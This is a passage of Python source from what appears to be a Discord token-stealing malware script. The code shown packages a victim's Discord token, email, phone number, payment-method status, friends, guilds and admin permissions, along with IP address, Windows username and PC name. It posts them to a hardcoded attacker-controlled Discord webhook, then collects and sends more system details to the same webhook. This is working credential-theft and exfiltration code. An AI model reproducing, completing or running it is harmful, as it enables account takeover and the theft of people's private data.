                                    ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                                'color': 3092790,
                            }
                        ],
                    }

                    urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1349056941867143173/v7QOtHduQjmLMitprwDUtW_ze0Fgxp7PbYDpAfduuuPfCMtQkya05bP1y-GjdOPIzEPp', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
                except urllib.error.HTTPError or json.JSONDecodeError:
                    continue
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue

        ip_address = socket.gethostbyname(socket.gethostname())
        public_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        memory_info = psutil.virtual_memory()
        total_memory = memory_info.total
        uptime_seconds = time.time() - psutil.boot_time()
        uptime = str(timedelta(seconds=uptime_seconds))
        hostname = socket.gethostname()
        current_user = getpass.getuser()
        
        data = {
            "ip_address": ip_address,
            "public_ip": public_ip,
            "python_version": python_version,
            "architecture": architecture,
            "total_memory": total_memory,
            "hostname": hostname,
            "uptime": uptime,
            "current_user": current_user,
        }
        
        webhook_url = 'https://discord.com/api/webhooks/1349056941867143173/v7QOtHduQjmLMitprwDUtW_ze0Fgxp7PbYDpAfduuuPfCMtQkya05bP1y-GjdOPIzEPp'
        
        fields = [
            {"name": "📍 IP Address", "value": data["ip_address"], "inline": True},
            {"name": "💾 Total Memory", "value": f"{data['total_memory'] / (1024 ** 2):.2f} MB", "inline": True},
            {"name": "⏳ Uptime", "value": data["uptime"], "inline": True},
        ]

        payload = {
            "embeds": [{
                "title": "📊 Extra Information",
                "color": 16711680,
                "fields": fields
            }]
        }

        requests.post(webhook_url, json=payload)

        main()

get_system_info()